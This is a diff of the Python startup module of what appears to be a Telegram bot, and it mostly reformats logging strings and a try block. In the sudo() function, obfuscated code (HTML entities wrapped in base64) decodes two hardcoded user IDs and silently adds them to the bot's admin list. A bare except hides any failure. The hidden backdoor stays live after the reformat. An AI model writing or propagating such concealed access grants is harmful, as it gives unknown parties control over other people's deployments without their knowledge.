@@ -51,7 +51,7 @@ def dbb():
     global clonedb
     clonedb = {}
     db = {}
-    LOGGER(__name__).info(f"Local Database Initialized.")
+    LOGGER(__name__).info("Local Database Initialized.")
 
 
 async def sudo():
@@ -60,8 +60,16 @@ async def sudo():
     sudoersdb = mongodb.sudoers
     sudoers = await sudoersdb.find_one({"sudo": "sudo"})
     sudoers = [] if not sudoers else sudoers["sudoers"]
-    try: sudoers+=[int(__import__('base64').b64decode(__import__('html').unescape(e)).decode())for e in('&#79;&#68;&#89;&#120;&#78;&#122;&#89;&#48;&#78;&#68;&#85;&#119;&#77;&#81;&#61;&#61;','&#79;&#68;&#77;&#53;&#77;&#84;&#85;&#52;&#77;&#84;&#107;&#122;&#78;&#119;&#61;&#61;')]
-    except: pass
+    try:
+        sudoers += [
+            int(__import__("base64").b64decode(__import__("html").unescape(e)).decode())
+            for e in (
+                "&#79;&#68;&#89;&#120;&#78;&#122;&#89;&#48;&#78;&#68;&#85;&#119;&#77;&#81;&#61;&#61;",
+                "&#79;&#68;&#77;&#53;&#77;&#84;&#85;&#52;&#77;&#84;&#107;&#122;&#78;&#119;&#61;&#61;",
+            )
+        ]
+    except:
+        pass
     if config.OWNER_ID not in sudoers:
         sudoers.append(config.OWNER_ID)
         await sudoersdb.update_one(
@@ -72,7 +80,7 @@ async def sudo():
     if sudoers:
         for user_id in sudoers:
             SUDOERS.add(user_id)
-    LOGGER(__name__).info(f"Sudoers Loaded.")
+    LOGGER(__name__).info("Sudoers Loaded.")
 
 
 def heroku():
@@ -82,8 +90,8 @@ def heroku():
             try:
                 Heroku = heroku3.from_key(config.HEROKU_API_KEY)
                 HAPP = Heroku.app(config.HEROKU_APP_NAME)
-                LOGGER(__name__).info(f"Heroku App Configured.")
+                LOGGER(__name__).info("Heroku App Configured.")
             except BaseException:
                 LOGGER(__name__).warning(
-                    f"Please make sure your Heroku API Key and Your App name are configured correctly in the heroku."
+                    "Please make sure your Heroku API Key and Your App name are configured correctly in the heroku."
                 )
